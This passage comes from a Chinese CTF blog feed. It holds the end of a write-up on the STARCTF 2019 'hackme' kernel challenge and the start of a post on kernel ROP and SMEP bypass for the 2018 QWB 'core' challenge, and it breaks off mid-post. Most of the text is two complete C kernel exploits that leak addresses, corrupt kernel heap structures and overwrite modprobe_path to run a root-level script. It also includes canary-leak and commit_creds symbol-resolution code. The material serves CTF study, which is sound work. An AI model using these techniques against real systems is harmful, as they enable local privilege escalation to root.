function_">delete</span><span class="params">(<span class="type">int</span> fd,<span class="type">size_t</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_info</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index=index;</span><br><span class="line">    data.size=<span class="number">0</span>;</span><br><span class="line">    data.offset=<span class="number">0</span>;</span><br><span class="line">    data.user_ptr=<span class="literal">NULL</span>;</span><br><span class="line">    ioctl(fd,<span class="number">0x30001</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">(<span class="type">int</span> fd,<span class="type">size_t</span> index,<span class="type">size_t</span> *ptr,<span class="type">size_t</span> size,<span class="type">size_t</span> offset)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">data_info</span> <span class="title">data</span>;</span></span><br><span class="line">    data.index=index;</span><br><span class="line">    data.size=size;</span><br><span class="line">    data.user_ptr=ptr;</span><br><span class="line">    data.offset=offset;</span><br><span class="line">    ioctl(fd,<span class="number">0x30003</span>,&amp;data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="type">char</span> *mem=<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="type">int</span> fd=open(<span class="string">&quot;/dev/hackme&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open error!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    add(fd,<span class="number">0</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">    show(fd,<span class="number">0</span>,mem,<span class="number">0x200</span>,<span class="number">-0x1e0</span>);</span><br><span class="line">    write(<span class="number">1</span>,mem,<span class="number">16</span>);</span><br><span class="line">    <span class="type">size_t</span> kernel_address = *((<span class="type">size_t</span> *)mem);  </span><br><span class="line">    <span class="type">size_t</span> leak_heap = *((<span class="type">size_t</span> *)(mem+<span class="number">0x20</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] leak kernel address %llx\n&quot;</span>,kernel_address);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] leak heap address 0x%llx\n&quot;</span>,leak_heap);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> kernel_base=kernel_address<span class="number">-0x847240</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel base %llx\n&quot;</span>,kernel_base);</span><br><span class="line">    <span class="type">size_t</span> mod_tree=kernel_base+<span class="number">0x811000</span>+<span class="number">0x100</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mod tree %llx\n&quot;</span>,mod_tree);</span><br><span class="line">    add(fd,<span class="number">1</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">    delete(fd,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//attack</span></span><br><span class="line">    edit(fd,<span class="number">1</span>,&amp;mod_tree,<span class="number">0x200</span>,<span class="number">-0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(mem,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">    add(fd,<span class="number">2</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">    add(fd,<span class="number">3</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">    show(fd,<span class="number">3</span>,mem,<span class="number">0x110</span>,<span class="number">-0x100</span>);</span><br><span class="line">    <span class="type">size_t</span> hackme_base = *((<span class="type">size_t</span> *)(mem+<span class="number">8</span>))<span class="number">-0x2320</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hackme_base %llx\n&quot;</span>,hackme_base); </span><br><span class="line">    <span class="type">size_t</span> pool=hackme_base+<span class="number">0x2400</span>+<span class="number">0xc0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pool address %llx\n&quot;</span>,pool);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    add(fd,<span class="number">4</span>,mem,<span class="number">0x200</span>);</span><br><span class="line">    add(fd,<span class="number">5</span>,mem,<span class="number">0x200</span>);</span><br><span class="line">    delete(fd,<span class="number">4</span>);</span><br><span class="line">    <span class="type">size_t</span> modprobe_math=kernel_base+<span class="number">0x83f960</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;modprobe_math %llx\n&quot;</span>,modprobe_math);</span><br><span class="line">    edit(fd,<span class="number">5</span>,&amp;pool,<span class="number">0x240</span>,<span class="number">-0x200</span>);</span><br><span class="line">    add(fd,<span class="number">6</span>,mem,<span class="number">0x200</span>);</span><br><span class="line">    <span class="type">int</span> fake_size=<span class="number">0x200</span>;</span><br><span class="line">    *((<span class="type">size_t</span> *)mem)=modprobe_math;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">8</span>))=fake_size;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">0x10</span>))=leak_heap+<span class="number">0x1b0</span>;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">0x18</span>))=fake_size;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">0x20</span>))=leak_heap+<span class="number">0xe02bfb0</span>;</span><br><span class="line">    *((<span class="type">size_t</span> *)(mem+<span class="number">0x28</span>))=fake_size;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(fd,<span class="number">7</span>,mem,<span class="number">0x200</span>);</span><br><span class="line">    <span class="type">char</span> *str=<span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="type">size_t</span> data1=leak_heap+<span class="number">0x3b0</span>;</span><br><span class="line">    <span class="type">size_t</span> data2=leak_heap+<span class="number">0xe02c3b0</span>;</span><br><span class="line">    <span class="built_in">strncpy</span>(str,<span class="string">&quot;/home/pwn/copy.sh\0&quot;</span>,<span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] leak heap address 0x%llx\n&quot;</span>,leak_heap);</span><br><span class="line">    edit(fd,<span class="number">0xc</span>,str,<span class="number">18</span>,<span class="number">0</span>);</span><br><span class="line">    edit(fd,<span class="number">0xd</span>,&amp;data1,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">    edit(fd,<span class="number">0xe</span>,&amp;data2,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag&#x27; &gt; /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/sir&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /home/pwn/sir&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    system(<span class="string">&quot;/home/pwn/sir&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /home/pwn/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>下面是 <a href="http://p4nda.top/">P4nda</a> 师傅的脚本，我和他的思路差不多</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALLOC 0x30000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL 0x30001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ 0x30003</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE 0x30002</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="type">size_t</span> idx;</span><br><span class="line">	<span class="type">void</span> *addr;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> len;</span><br><span class="line">	<span class="type">long</span> <span class="type">long</span> offset;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> idx,<span class="type">char</span> *user,<span class="type">long</span> <span class="type">long</span> len)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">	cmd.idx = idx;</span><br><span class="line">	cmd.len = len;</span><br><span class="line">	cmd.addr = user;</span><br><span class="line">	ioctl(fd,ALLOC,&amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> idx)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">	cmd.idx = idx;</span><br><span class="line">	ioctl(fd,DEL,&amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_from_kernel</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> idx,<span class="type">char</span> *user,<span class="type">long</span> <span class="type">long</span> len,<span class="type">long</span> <span class="type">long</span> offset)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">	cmd.idx = idx;</span><br><span class="line">	cmd.len = len;</span><br><span class="line">	cmd.addr = user;</span><br><span class="line">	cmd.offset = offset;</span><br><span class="line">	ioctl(fd,READ,&amp;cmd);	</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_to_kernel</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> idx,<span class="type">char</span> *user,<span class="type">long</span> <span class="type">long</span> len,<span class="type">long</span> <span class="type">long</span> offset)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">	cmd.idx = idx;</span><br><span class="line">	cmd.len = len;</span><br><span class="line">	cmd.addr = user;</span><br><span class="line">	cmd.offset = offset;</span><br><span class="line">	ioctl(fd,WRITE,&amp;cmd);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_hex</span><span class="params">( <span class="type">char</span> *buf,<span class="type">int</span> size)</span>&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;(size/<span class="number">8</span>);i++)&#123;</span><br><span class="line">		<span class="keyword">if</span> (i%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i/<span class="number">2</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>,*(<span class="type">size_t</span> * )(buf + i*<span class="number">8</span>));</span><br><span class="line">		<span class="keyword">if</span> (i%<span class="number">2</span> == <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		&#125;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> fd = open(<span class="string">&quot;/dev/hackme&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="type">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	<span class="type">size_t</span> heap_addr , kernel_addr,mod_addr;</span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] bad open /dev/hackme\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memset</span>(mem,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">0</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">1</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">2</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">3</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	delete(fd,<span class="number">1</span>);</span><br><span class="line">	delete(fd,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	read_from_kernel(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">	heap_addr = *((<span class="type">size_t</span>  *)mem);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] heap addr : %16llx\n&quot;</span>,heap_addr );</span><br><span class="line">	read_from_kernel(fd,<span class="number">0</span>,mem,<span class="number">0x200</span>,<span class="number">-0x200</span>);</span><br><span class="line">	kernel_addr = *((<span class="type">size_t</span>  *)(mem+<span class="number">0x28</span>)) ;</span><br><span class="line">	<span class="keyword">if</span> ((kernel_addr &amp; <span class="number">0xfff</span>) != <span class="number">0xae0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] maybe bad kernel leak : %16llx\n&quot;</span>,kernel_addr);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">		</span><br><span class="line">	kernel_addr -= <span class="number">0x849ae0</span>; <span class="comment">//0x849ae0 - sysctl_table_root</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] kernel addr : %16llx\n&quot;</span>,kernel_addr );	</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">memset</span>(mem,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">	*((<span class="type">size_t</span> *)mem) = (<span class="number">0x811000</span> + kernel_addr + <span class="number">0x40</span>); <span class="comment">// mod_tree +0x40</span></span><br><span class="line">	write_to_kernel(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">	</span><br><span class="line">	alloc(fd,<span class="number">5</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">6</span>,mem,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	read_from_kernel(fd,<span class="number">6</span>,mem,<span class="number">0x40</span>,<span class="number">-0x40</span>);</span><br><span class="line">	mod_addr =  *((<span class="type">size_t</span>  *)(mem+<span class="number">0x18</span>)) ;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] mod addr : %16llx\n&quot;</span>,mod_addr );	</span><br><span class="line">	</span><br><span class="line">	delete(fd,<span class="number">2</span>);</span><br><span class="line">	delete(fd,<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">	*((<span class="type">size_t</span> *)mem) = (<span class="number">0x2400</span> + mod_addr + <span class="number">0xc0</span>); <span class="comment">// mod_tree +0x40</span></span><br><span class="line">	write_to_kernel(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">7</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	*((<span class="type">size_t</span> *)(mem+<span class="number">0x8</span>)) = <span class="number">0x100</span>; </span><br><span class="line">	*((<span class="type">size_t</span> *)mem) = (<span class="number">0x83f960</span> + kernel_addr ); <span class="comment">//ffffffff8183f960 D modprobe_path</span></span><br><span class="line">	alloc(fd,<span class="number">8</span>,mem,<span class="number">0x100</span>); <span class="comment">// pool</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">strncpy</span>(mem,<span class="string">&quot;/home/pwn/copy.sh\0&quot;</span>,<span class="number">18</span>);</span><br><span class="line">	write_to_kernel(fd,<span class="number">0xc</span>,mem,<span class="number">18</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag&#x27; &gt; /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;chmod +x /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;chmod +x /home/pwn/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;/home/pwn/dummy&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304172129949.png" alt="image-20230417212958765" style="zoom:50%;" />





<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/yongbaoii/article/details/123583502">(47条消息) linux kernal pwn STARCTF 2019 hackme（一） 劫持modprobe_path_yongbaoii的博客-CSDN博客</a></p>
<p><a href="https://kileak.github.io/ctf/2019/xctf-hackme/">XCTF - *CTF 2019 - hack_me | kileak</a></p>
<p><a href="http://p4nda.top/2019/05/01/starctf-2019-hackme/">(<em>´∇｀</em>) 天亮了~ 【KERNEL PWN】STARCTF 2019 hackme 解题思路 | p4nda’s blog</a></p>
<p>[<a href="https://bbs.kanxue.com/thread-254178.htm">原创]Linux Kernel Exploit 内核漏洞学习(4)-RW Any Memory-二进制漏洞-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com)</a></p>
<p><a href="https://www.secpulse.com/archives/153929.html">基于modprobe_path覆盖的Linux内核漏洞利用技术 - SecPulse.COM | 安全脉搏</a></p>
]]></content>
      <categories>
        <category>学习总结</category>
      </categories>
      <tags>
        <tag>kernel-RW Any Memory</tag>
      </tags>
  </entry>
  <entry>
    <title>关于 kernel-ROP &amp; ret2user &amp; bypass-SMEP 的学习总结</title>
    <url>/posts/a31a5755.html</url>
    <content><![CDATA[<p>内核态的 <code>ROP</code> 和用户态的思路和做法是一样的，都是利用 <code>gadget</code> 来不断控制执行流，进行任意的函数调用。不过获取基地址还有搜索 <code>gadget</code> 等一些小细节发生了变化，但思想不变，所以理解起来应该还是很快的</p>
<span id="more"></span>

<h2 id="kernel-ROP"><a href="#kernel-ROP" class="headerlink" title="kernel-ROP"></a>kernel-ROP</h2><p>例题是 <a href="https://github.com/cc-sir/ctf-challenge/tree/master/2018%20%E5%BC%BA%E7%BD%91%E6%9D%AFkernel%20pwn-core">2018强网杯 pwn-core</a></p>
<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>发现 <code>ioctl</code> 函数中可以控制 <code>off</code> 这个全局变量（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051126597.png" alt="image-20230405112654518" style="zoom:50%;" />



<p><code>core_read</code> 函数，存在数组索引溢出的漏洞， <code>off</code> 我们可控，且程序没有做任何检查，<code>v5</code> 是在栈中，因此配合 <code>copy_to_user</code> 函数可以泄露栈中的任意数据，这里考虑来泄露 <code>canary</code> 以便后面的 <code>rop</code> 执行。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051128320.png" alt="image-20230405112810250" style="zoom:50%;" />



<p>通过分析 <code>off</code> 为 <code>0x40</code> 的时候<code>&amp;v5[off]</code> 正好指向了 <code>canary</code> 的位置（这里就是 <code>PWN</code> 手的基本技能，所以不再赘述），<code>copy_to_user</code> 会将内核中的数据 <code>copy</code> 到用户空间中，也就是赋值给了 <code>a1</code> 。</p>
<p><code>core_copy_func</code> 函数中存在一个强转的漏洞（如下），将 <code>__int64</code> 类型的 <code>a1</code> ，强转为了 <code>unsigned __int16</code> 类型，如果我们将 <code>a1</code> 设置为 <code>0xffffffffffff0000 | (0xd0)</code> ，就可以在绕过 <code>if(a1 &gt; 63)</code> 检查的情况下执行 <code>qmemcpy</code> 函数完成栈溢出</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081646889.png" alt="image-20230408164606742" style="zoom:50%;" />

<p>不过上面这里只是能控制 <code>a1</code> 这个字节数，想要 <code>ROP</code> 还需要控制 <code>name</code> 数组中的数据。</p>
<p>通过查看 <code>core_write</code> 函数，发现这里可以直接控制 <code>name</code> 数组中的内容，如此任意读和任意写都有了，就可以开始我们的 <code>kernel-ROP</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081718605.png" alt="image-20230408171831543"></p>
<h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081726031.png" alt="image-20230408172611971"></p>
<p>因为程序开了 <code>canary</code> ，所以 <code>ROP</code> 之前需要先进行泄露 <code>canary</code></p>
<h4 id="泄露-canary"><a href="#泄露-canary" class="headerlink" title="泄露 canary"></a>泄露 <code>canary</code></h4><p>所以泄露 <code>canary</code> 的部分 <code>exp</code> 如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> canary=<span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x80</span>];</span><br><span class="line">    <span class="type">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;core fd is %d\n&quot;</span>,fd);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889B</span>,&amp;buf);</span><br><span class="line">    canary=(<span class="type">size_t</span>)(buf[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;canary is %p\n&quot;</span>,canary);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里一定要注意，从内核 <code>copy</code> 过来的数据有 <code>64</code> 个字节，而不是只有 <code>canary</code> ，当时程序就定义了一个 <code>int</code> 类型的变量  <code>canary</code> 传入了地址进行接收，结果直接报错（原因是破坏了用户程序的 <code>canary</code>）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051735283.png" alt="image-20230405173514198"></p>
<h4 id="获取函数的真实地址"><a href="#获取函数的真实地址" class="headerlink" title="获取函数的真实地址"></a>获取函数的真实地址</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>,prepare_kernel_cred = <span class="number">0</span>,vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span>&#123;</span><br><span class="line">   FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))&#123;</span><br><span class="line">      <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//End condition</span></span><br><span class="line">      <span class="comment">//find commit_creds</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">         vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>,vmlinux_base);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//find prepare_kernel_cred</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">         vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!commit_creds &amp; !prepare_kernel_cred)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]read kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>从 <code>/proc/kallsyms</code> 文件中可以获取任意一个函数的真实地址，本题的 <code>init</code> 文件中将 <code>/proc/kallsyms</code> 文件 <code>copy</code> 了一份叫做 <code>/tmp/kallsyms</code> ，读取该文件，即可得到函数的真实地址，但如果想获取 <code>vmlinux</code> 中的基地址，我们还需要拿到函数在 <code>vmlinux</code> 中的偏移。</p>
<h5 id="获取vmlinux中的函数偏移"><a href="#获取vmlinux中的函数偏移" class="headerlink" title="获取vmlinux中的函数偏移"></a>获取vmlinux中的函数偏移</h5><p>因为开了 <code>KASLR</code> ，所以函数的真实地址需要获取基地址和函数偏移才行。</p>
<p>使用 <code>readelf -s vmlinux | grep vuln</code> 获取其地址（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051802154.png" alt="image-20230405180248088"></p>
